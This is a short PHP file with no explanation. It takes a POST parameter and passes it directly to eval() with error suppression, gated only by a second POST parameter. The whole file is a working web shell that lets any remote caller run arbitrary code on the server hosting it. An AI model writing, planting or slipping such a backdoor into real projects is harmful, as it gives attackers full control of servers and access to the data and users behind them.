<?php
$eval_value=isset($_POST['eval_value'])?$_POST['eval_value']:'';
$action=isset($_POST['action'])?$_POST['action']:'eval';
if($action=='eval_in_html') 
	@eval($eval_value);
?>